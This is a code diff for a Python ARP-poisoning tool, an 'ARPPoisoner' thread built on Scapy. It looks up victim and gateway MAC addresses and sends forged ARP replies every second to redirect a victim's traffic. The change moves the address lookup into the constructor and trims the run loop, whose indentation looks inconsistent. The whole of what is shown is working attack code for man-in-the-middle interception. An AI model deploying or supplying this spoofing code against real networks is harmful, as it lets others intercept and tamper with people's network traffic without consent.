@@ -11,6 +11,9 @@ class ARPPoisoner(threading.Thread):
         self.interface = 'eth0'
         threading.Thread.__init__(self)
         self.__stopped = threading.Event()
+        self.victimHwAddr = self.getHwAddrVictim()
+        self.usurpedHwAddr = self.getHwAddrUsurped()
+
 
     def __getHwaddr(self, ip):
         resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10, verbose=0)
@@ -37,13 +40,10 @@ class ARPPoisoner(threading.Thread):
         send(ARP(op=2, pdst=self.victimIp, hwdst=self.victimHwAddr, psrc=self.usurpedIp), verbose=0)
 
     def run(self):
-        if not self.victimHwAddr:
-            self.victimHwAddr = self.getHwAddrVictim()
-        if not self.usurpedHwAddr:
-            self.usurpedHwAddr = self.getHwAddrUsurped()
-        while not self.__stopped.isSet():
+       while not self.__stopped.isSet():
             self.usurp()
             self.__stopped.wait(1.0)
+       print('return ARP run')
 
     def stop(self):
         self.__stopped.set()
@@ -58,12 +58,8 @@ if __name__ == '__main__':
         poisoner = ARPPoisoner(sys.argv[1], sys.argv[2], sys.argv[3])
     else:
         poisoner = ARPPoisoner(sys.argv[1], sys.argv[2])
-    hwaddr_victim = poisoner.getHwAddrVictim()
-    hwaddr_usurped = poisoner.getHwAddrUsurped()
-    if hwaddr_victim:
-        print("Victim MAC Address: " + hwaddr_victim)
-    if hwaddr_usurped:
-        print("Usurped MAC Address: " + hwaddr_usurped)
+    print("Victim MAC Address: " + poisoner.victimHwAddr)
+    print("Usurped MAC Address: " + poisoner.usurpedHwAddr)
     try:
         poisoner.run();
         threading.Event().wait()
